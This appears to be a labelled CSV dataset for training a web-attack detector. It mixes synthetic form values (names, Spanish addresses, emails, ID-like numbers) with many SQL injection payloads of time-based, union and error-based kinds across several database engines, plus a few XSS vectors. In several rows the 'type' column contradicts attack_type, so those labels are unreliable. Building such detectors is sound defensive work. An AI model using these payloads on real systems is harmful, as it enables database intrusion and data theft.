Text,attack_type,Label,type
wilde@casasdefamosos.zw,norm,0,normal
mohr,norm,0,normal
"-7122"") union all select 4002,4002,4002,4002,4002,4002,4002,4002#",sqli,1,sql
1))) or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
"-8893%') union all select 1254,1254--",sqli,1,sql
-7207' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'obxw'='obxw,sqli,1,sql
burkhard,norm,0,normal
"1' in boolean mode)(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)#",sqli,1,sql
chiaoyun,norm,0,normal
vislumbrar,norm,0,normal
pedro carabia 195,norm,0,normal
pinela,norm,0,normal
82pe6m77b57i0a+d,norm,0,normal
7ngr5ta3ente,norm,0,normal
1));select (case when (6843=2657) then 6843 else 6843*(select 6843 from information_schema.character_sets) end)#,sqli,1,sql
desfacedora,norm,0,normal
7173,norm,0,normal
rasifo,norm,0,normal
"1%');iif(5257=5257,1,1/0)",sqli,1,sql
monvar/monver,norm,0,normal
1) as lvfu where 5831=5831 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1,sql
darbanville@chicasdiabolo.tr,norm,0,normal
"plaza museo, 45, 6e",norm,0,normal
rabs,norm,0,normal
1))) order by 1#,sqli,1,normal
diago dardn,norm,0,normal
1') and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('rjjo'='rjjo,sqli,1,sql
"1%"") union all select null,null,null,null,null,null--",sqli,1,sql
1')) waitfor delay '0:0:5'--,sqli,1,sql
gemelli@hiperxxx.asia,norm,0,normal
"<meta http-equiv=""set-cookie"" content=""userid=<script>document.cookie=true</script>"">",xss,2,xss
scardetta huerta,norm,0,normal
5r32n7,norm,0,normal
repinarse,norm,0,normal
0527381182420490,norm,0,normal
8251009613844272,norm,0,normal
78370849m,norm,0,normal
"1'+(select rqcw where 9002=9002 union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
"calle belen 10, 8a",norm,0,normal
corera,norm,0,normal
akashi1@g-audio.td,norm,0,normal
"1' where 3425=3425 and elt(4249=4249,7259)--",sqli,1,sql
odelinda,norm,0,normal
tracisto arroyave,norm,0,normal
glickman,norm,0,normal
27643638f,norm,0,normal
"plaa mig de can clos, 122",norm,0,normal
palamenta,norm,0,normal
"1')) or 8421=(select count(*) from generate_series(1,5000000)) and (('lqpd'='lqpd",sqli,1,sql
soguillo,norm,0,normal
nixon@chinavende.bw,norm,0,normal
doa menca,norm,0,normal
giuliana,norm,0,normal
"1"") and (select * from (select(sleep(5)))fzno) and (""zvew"" like ""zvew",sqli,1,sql
martn de yeltes,norm,0,normal
"minguez, 98",norm,0,normal
51795949h,norm,0,normal
frankfather@andrestabernero.dj,norm,0,normal
freixes navaln,norm,0,normal
jalaie,norm,0,normal
card patrn,norm,0,normal
f09$m3natriz,norm,0,normal
"calle santa apolonia, 47,",norm,0,normal
sequero,norm,0,normal
"1%"")(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (""%""=""",sqli,1,sql
4789er56,norm,0,normal
"1""))) and 8407=(select count(*) from generate_series(1,5000000)) and (((""ynwr"" like ""ynwr",sqli,1,sql
6187378791844475,norm,0,normal
"c/ berruguete 23,",norm,0,normal
"<bgsound src=""javascript:alert('crosssitescripting');"">",xss,2,xss
"1'+(select blbd where 7451=7451 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a))+'",sqli,1,sql
linden,norm,0,normal
22997473a,norm,0,normal
arxe matsumiya,norm,0,normal
"-2204'||(select 'bwae' from dual where 4884=4884 union all select 4884,4884,4884,4884,4884,4884,4884,4884,4884,4884#",sqli,1,sql
fulmnica,norm,0,normal
narrillos del lamo,norm,0,normal
"1%';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and '%'='",sqli,1,sql
genova,norm,0,normal
"1'||(select 'jjpy' from dual where 6295=6295;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
5ifi3a2i05,norm,0,normal
"-5587%') or elt(1032=1032,3623) and ('%'='",sqli,1,normal
rigaud@arroyo-molinos.an,norm,0,normal
clampitt,norm,0,normal
yessica,norm,0,normal
"zoma, la",norm,0,normal
"-5763'))) union all select 1640,1640,1640,1640,1640,1640,1640,1640,1640,1640#",sqli,1,sql
"<style type=""text/css"">body{background:url(""javascript:alert('crosssitescripting')"")}</style>",xss,2,xss
"1) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (1185=1185",sqli,1,sql
robleda,norm,0,normal
franchetti.martinsan@elsentidodelavida.qa,norm,0,normal
hortezuela de ocn,norm,0,normal
tejeda y segoyuela,norm,0,normal
41960,norm,0,normal
"1) where 2390=2390;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
1i6p06ej7,norm,0,normal
"1%""))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
"1))) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
"1%"")) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((""%""=""",sqli,1,sql
cotu3a,norm,0,normal
calle jaime ferranz 51,norm,0,normal
villanueva de huerva,norm,0,normal
1')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('ltki'='ltki,sqli,1,sql
"1"";waitfor delay '0:0:5'--",sqli,1,sql
"1'))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('ogwd' like 'ogwd",sqli,1,sql
"1"" and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))",sqli,1,sql
maurice@salacomplices.ua,norm,0,normal
4171760827421606,norm,0,normal
3702,norm,0,normal
"-1333"")) union all select 2376,2376,2376,2376,2376,2376,2376,2376,2376--",sqli,1,sql
"(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",sqli,1,sql
piedramillera,norm,0,normal
"-9928"")) union all select 7511,7511,7511,7511,7511,7511,7511,7511#",sqli,1,sql
"pl. pescaderia, 158, 7-a",norm,0,normal
"-8667'+(select ymmg where 6132=6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132#",sqli,1,sql
"-2743 union all select 6757,6757,6757,6757,6757,6757--",sqli,1,sql
(select (case when (8130=5894) then 8130 else 8130*(select 8130 from information_schema.character_sets) end)),sqli,1,sql
tanir,norm,0,normal
manganear,norm,0,normal
carcabuey,norm,0,normal
bota,norm,0,normal
"1') as dvoy where 7906=7906 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
"carretera industrial 149,",norm,0,normal
"-9405') union all select 8283,8283,8283,8283--",sqli,1,sql
1%') and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('%'=',sqli,1,sql
"grupo santa teresa 155,",norm,0,normal
1 where 3956=3956;(select * from (select(sleep(5)))srmq)--,sqli,1,sql
juifen5,norm,0,normal
1') where 7629=7629 rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
oktar,norm,0,normal
soraya,norm,0,normal
6503452667221524,norm,0,normal
"1')) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (('tblb'='tblb",sqli,1,sql
"pl. constitucion, 61",norm,0,normal
macreyno,norm,0,normal
"1"") as kuuf where 6908=6908;if(7899=7899) select 7899 else drop function zbbp--",sqli,1,sql
du-tuan,norm,0,normal
"-7574%"") or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""%""=""",sqli,1,sql
venfica,norm,0,normal
kaluzny3,norm,0,normal
"1"") as ebvt where 5305=5305;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
46624,norm,0,normal
"1"" or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""kbex"" like ""kbex",sqli,1,sql
9385780627956523,norm,0,normal
21905566k,norm,0,normal
1';select (case when (1014=4280) then 1014 else 1014*(select 1014 from mysql.db) end)#,sqli,1,sql
"1%'))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
10550,norm,0,normal
enseriarse,norm,0,normal
"<button.onclick=""alert(string.fromcharcode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,34,67,114,111,115,115,83,105,116,101,83,99,114,105,112,116,105,110,103,64,82,69,77,7,86,69,34,41,60,47,115,99,114,105,112,116,62));"">string:from.char.code</button></body></html>",xss,2,sql
"-6870"") as deox where 8198=8198 union all select 8198#",sqli,1,sql
10261,norm,0,normal
9515176672855225,norm,0,normal
24324,norm,0,normal
test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>x</button>,xss,2,normal
"plaza de la constitucion 40, 5e",norm,0,normal
neugebauer@buscamoto.gw,norm,0,normal
10460,norm,0,normal
-9653') where 2705=2705 or 9323=9323#,sqli,1,normal
"c/ motilla 19, 1c",norm,0,normal
"1%') or 8421=(select count(*) from generate_series(1,5000000)) and ('%'='",sqli,1,sql
hundley@evelin.com.pf,norm,0,normal
"1"") and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (""lsca"" like ""lsca",sqli,1,normal
"1"";select pg_sleep(5) and ""zhsc""=""zhsc",sqli,1,sql
blanc hormachea,norm,0,normal
"1%"");select (case when (3168=5577) then 3168 else 3168*(select 3168 from mysql.db) end)#",sqli,1,sql
"calle arriola 29,",norm,0,normal
sayers,norm,0,normal
"1) where 7729=7729;iif(5257=5257,1,1/0)",sqli,1,sql
"-1351"" where 6968=6968 or 5684=8582",sqli,1,normal
"1'||(select 'ggfx' where 4932=4932 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5))||'",sqli,1,sql
sabourin,norm,0,normal
1022652655889356,norm,0,normal
"-8258"")) as swjp where 2681=2681 union all select 2681,2681,2681,2681,2681,2681--",sqli,1,sql
"-7381')) or elt(5882=5919,5919) and (('nzri'='nzri",sqli,1,normal
inconstitucional,norm,0,normal
"1""));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
1%'))) and 7533=7533 and ((('%'=',sqli,1,normal
ivon,norm,0,normal
-7941 or (5822=8754)*8754-- eepn,sqli,1,sql
"<div style=""width: expression(alert('crosssitescripting'));"">",xss,2,sql
"1',(select * from generate_series(2636,2636,case when (2636=7071) then 1 else 0 end) limit 1)",sqli,1,sql
bohdan,norm,0,normal
overdyke,norm,0,normal
"hospitalet de llobregat, l'",norm,0,normal
"calle son pujol des garroves, s/n,",norm,0,normal
28529,norm,0,normal
indocto,norm,0,normal
3709256796210266,norm,0,normal
"1) as kjsd where 1670=1670 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"grado, el",norm,0,normal
"1%"")))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (((""%""=""",sqli,1,sql
"c/ de pedro vidal s/n, 11d",norm,0,normal
mesnadero,norm,0,normal
hilom3r0ismo,norm,0,normal
floriano,norm,0,normal
wilie,norm,0,normal
gomarov@manuelpaloma.fr,norm,0,normal
aldeano,norm,0,normal
8a86ra7,norm,0,normal
8400392219443841,norm,0,normal
78717162f,norm,0,normal
laxis7o,norm,0,normal
morales del vino,norm,0,normal
peuela sains,norm,0,normal
"calle uruguay, 161, 11-c",norm,0,normal
"-3378%"")) union all select 9357,9357,9357,9357,9357--",sqli,1,sql
04869,norm,0,normal
"1%""));select sleep(5)#",sqli,1,sql
6351,norm,0,normal
delvische@softstylestudio.ly,norm,0,normal
7840792716096931,norm,0,normal
"1 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",sqli,1,sql
hlinka,norm,0,normal
"1')) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('fowu' like 'fowu",sqli,1,sql
hervert@clinicadentalsansalvador.ch,norm,0,normal
"<select id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>",xss,2,xss
"1'+(select vohg where 6383=6383 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))+'",sqli,1,sql
angold@callofduty6.nu,norm,0,normal
giertych,norm,0,normal
-8701%')) or (4843=1690)*1690 and (('%'=',sqli,1,normal
"1)) as hxzh where 9284=9284;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
al769i4,norm,0,normal
a3o1erada,norm,0,normal
"1)) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((8554=8554",sqli,1,normal
baretto0@drae2.tk,norm,0,normal
48673442z,norm,0,normal
"';alert(string.fromcharcode(88,83,83))//';alert(string.fromcharcode(88,83,83))//"";alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))//"";alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))//--></script>"">'><script>alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))</script>",xss,2,xss
99999464h,norm,0,normal
"1%"")) union all select null,null,null,null#",sqli,1,sql
"1"") and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""bmbg"" like ""bmbg",sqli,1,normal
0o380ado6,norm,0,normal
96312323f,norm,0,normal
whiskin,norm,0,normal
"1"") as qirf where 6200=6200 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",sqli,1,sql
46542533d,norm,0,normal
15635,norm,0,normal
vital,norm,0,normal
antonino,norm,0,normal
88918773z,norm,0,normal
"1"") or (select * from (select(sleep(5)))sddo)#",sqli,1,sql
"1') and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('plfa'='plfa",sqli,1,sql
ciudad real,norm,0,normal
daphne,norm,0,normal
44220,norm,0,normal
"1"" where 2512=2512 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
1' rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
rabanal morante,norm,0,normal
"1;select count(*) from generate_series(1,5000000)# fnck",sqli,1,sql
7110252413473830,norm,0,normal
"-3298 union all select 7618,7618,7618,7618,7618,7618,7618,7618,7618,7618#",sqli,1,sql
"1)));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (((5432=5432",sqli,1,sql
"1')) as clhk where 4607=4607 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
"zabalbide, 114,",norm,0,normal
"c/ granate 13, 12h",norm,0,normal
de la horra arzaluz,norm,0,normal
"1%')) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('%'='",sqli,1,sql
navalmanzano,norm,0,normal
56801763c,norm,0,normal
dougall,norm,0,normal
sartaguda,norm,0,normal
lamphier,norm,0,normal
18540,norm,0,normal
"1'))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('gmbd'='gmbd",sqli,1,sql
protoalbitar,norm,0,normal
"1"";select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",sqli,1,sql
"-1737' or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'fsmd'='fsmd",sqli,1,sql
van_eyk,norm,0,normal
"1)) as cusv where 4871=4871 and elt(1210=1210,sleep(5))--",sqli,1,sql
"calle marques de montevirgen, 183",norm,0,normal
"1') as ekjw where 5477=5477 union all select null,null,null,null,null--",sqli,1,sql
"c/ amador de los rios, 131, 1?g",norm,0,normal
cunillera penades,norm,0,normal
wailing@mariposasentudia.je,norm,0,normal
satorras maynol,norm,0,normal
32493489d,norm,0,normal
07094139l,norm,0,normal
"1) where 6954=6954 and 3824=benchmark(5000000,md5(0x76555642))--",sqli,1,sql
borzani jordan,norm,0,normal
"-8695 union all select 6087,6087,6087,6087,6087,6087,6087,6087,6087,6087#",sqli,1,sql
50700,norm,0,normal
1)) as qgma where 7675=7675 rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
pau gargallo 120 8-b,norm,0,normal
1437,norm,0,normal
-9742) where 8409=8409 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,sqli,1,sql
1'||(select 'uedy' where 8816=8816;select case when 6558=4327 then 1 else null end--,sqli,1,sql
38670,norm,0,normal
1' or sleep(5),sqli,1,normal
"espinar, el",norm,0,normal
monasterio,norm,0,normal
8452550180541850,norm,0,normal
1)) and (select * from (select(sleep(5)))fzno) and ((5171=5171,sqli,1,sql
02215,norm,0,normal
haeussler@corjet.jo,norm,0,normal
rajadell,norm,0,normal
"1"" where 1452=1452 union all select null,null,null,null--",sqli,1,sql
terkel@so-tel.cx,norm,0,normal
esplendoroso,norm,0,normal
"1"") where 1807=1807;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
derch mallol,norm,0,normal
"1"" or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ""cgpm"" like ""cgpm",sqli,1,sql
obdulio,norm,0,normal
eimile,norm,0,normal
"-9496))) or elt(7511=3951,3951) and (((3514=3514",sqli,1,normal
"1'))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((('dbsm'='dbsm",sqli,1,normal
6038552435376719,norm,0,normal
samar,norm,0,normal
"robert graves, 101",norm,0,normal
cabanelles,norm,0,normal
04212893y,norm,0,normal
peralejos de arriba,norm,0,normal
pastoral,norm,0,normal
inund!ar,norm,0,normal
bunker5,norm,0,normal
1')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('czqk' like 'czqk,sqli,1,sql
25260,norm,0,normal
8224727422356159,norm,0,normal
-1354)) or 8571=8571--,sqli,1,sql
"1"";select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""hjxh""=""hjxh",sqli,1,sql
42193,norm,0,normal
7896,norm,0,normal
terradas provasi,norm,0,normal
39584,norm,0,normal
"-7388"") as rlth where 5746=5746 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
"1%""))) or sleep(5) and (((""%""=""",sqli,1,normal
"1%"")));begin dbms_lock.sleep(5); end--",sqli,1,sql
"1"")) or sleep(5) and ((""mtmb"" like ""mtmb",sqli,1,normal
venialbo,norm,0,normal
san juan bosco 113 1-d,norm,0,normal
"1;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)-- rucf",sqli,1,sql
fergus,norm,0,normal
"1"" where 7005=7005;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
"1"" where 8016=8016;select count(*) from generate_series(1,5000000)--",sqli,1,sql
14810,norm,0,normal
heal@quadernideilgarda.gob,norm,0,normal
<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('crosssitescripting')></object>,xss,2,xss
42685012w,norm,0,normal
-9358' or 9887=2569--,sqli,1,sql
firmn,norm,0,normal
0600142480531797,norm,0,normal
20530,norm,0,normal
1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and 'sqvt' like 'sqvt,sqli,1,sql
calle medina azahara 136 5f,norm,0,normal
8199,norm,0,normal
"-1212%') or make_set(7588=2306,2306) and ('%'='",sqli,1,normal
7r6d54ti450,norm,0,normal
1055239425022881,norm,0,normal
sim5e469,norm,0,normal
"plaza diego herrera lorenzo, 148 8?e",norm,0,normal
5ictoriosamente,norm,0,normal
karem,norm,0,normal
"1%')) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
1')) as yqcl where 5026=5026 rlike (select * from (select(sleep(5)))sgvo)--,sqli,1,sql
thuong,norm,0,normal
benajas rodrguez,norm,0,normal
"1') where 2284=2284 and make_set(8403=8403,8899)--",sqli,1,sql
(1589=1589)*1,sqli,1,normal
"1'))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((('yqhk'='yqhk",sqli,1,sql
76,norm,0,normal
teddie,norm,0,normal
alexsandra,norm,0,normal
9osquil9a6,norm,0,normal
"1""))) union all select null--",sqli,1,sql
"1)) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((8965=8965",sqli,1,sql
"avda. manuel siurot, 12",norm,0,normal
"1"")) as qode where 2398=2398 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",sqli,1,sql
92086641t,norm,0,normal
"1 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))# qmkh",sqli,1,normal
-5299 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),sqli,1,sql
52530900g,norm,0,normal
"santa leonor, 187, 7?h",norm,0,normal
3188,norm,0,normal
hetera,norm,0,normal
c/ cabo alomar blanes 122 10?b,norm,0,normal
83585437x,norm,0,normal
marko,norm,0,normal
"1%"" or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ""%""=""",sqli,1,sql
-9005 union all select 4410#,sqli,1,sql
serban,norm,0,normal
"-2898"" where 3301=3301 union all select 3301,3301,3301,3301,3301,3301,3301,3301,3301,3301#",sqli,1,sql
guntekin,norm,0,normal
l655a2uta,norm,0,normal
"-9356 or elt(1032=1032,3623)-- izgi",sqli,1,sql
"c/ jose belso castao, s/n,",norm,0,normal
morata de jiloca,norm,0,normal
"<iframe/src=""data:text/html; base64 ,pgjvzhkgb25sb2fkpwfszxj0kdeppg=="">",xss,2,sql
magriny,norm,0,normal
abondadamente,norm,0,normal
ashberry,norm,0,normal
"1"" and 6969=(select 6969 from pg_sleep(5))",sqli,1,sql
"1"") where 2758=2758 union all select null,null,null,null,null,null,null--",sqli,1,sql
1%'));select (case when (5203=6330) then 5203 else 5203*(select 5203 from mysql.db) end)#,sqli,1,sql
couri-manahan@copiar.com.fm,norm,0,normal
"1)) as zoso where 3633=3633;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
-5803) where 8651=8651 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1,sql
"1' and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
colodner@proofreader.sj,norm,0,normal
alm.ora,norm,0,normal
06589147s,norm,0,normal
autonell,norm,0,normal
berja,norm,0,normal
bossa,norm,0,normal
"-3930%"")) order by 1#",sqli,1,normal
1) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (3945=3945,sqli,1,sql
1') or sleep(5) and ('fizk'='fizk,sqli,1,normal
19245,norm,0,normal
cab,norm,0,normal
1) rlike sleep(5),sqli,1,normal
nalia,norm,0,normal
"oso, el",norm,0,normal
"-9583%"")) union all select 9349,9349,9349,9349,9349,9349,9349--",sqli,1,sql
brisia,norm,0,normal
18178277c,norm,0,normal
<iframe src=http://vulnerability-lab.com/>@gmail.com,xss,2,normal
"1') as uqkz where 8482=8482 and 8407=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"1 where 4372=4372;select * from generate_series(3086,3086,case when (3086=3327) then 1 else 0 end) limit 1--",sqli,1,sql
"1)) as ipfy where 1189=1189;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
grubel8@albeiteria.kw,norm,0,normal
"1%""))) and 3824=benchmark(5000000,md5(0x76555642)) and (((""%""=""",sqli,1,normal
88833808b,norm,0,normal
revestimiento,norm,0,normal
esser-wrixon5@atorre.se,norm,0,normal
1' order by 1#,sqli,1,normal
"-2153'||(select 'sofs' where 4126=4126 union all select 4126,4126,4126,4126,4126#",sqli,1,sql
"1) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (3343=3343",sqli,1,sql
"1"") and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (""thkh"" like ""thkh",sqli,1,sql
08192,norm,0,normal
"-5509%""))) union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--",sqli,1,sql
am6456ra,norm,0,normal
4761077405436088,norm,0,normal
"plaa de augusto miranda, 193,",norm,0,normal
6531431919171426,norm,0,normal
inmaculada,norm,0,normal
"1 where 8045=8045 union all select null,null,null--",sqli,1,sql
cuerva,norm,0,normal
swenson@pasajesaereosbaratos.do,norm,0,normal
jeanhee,norm,0,normal
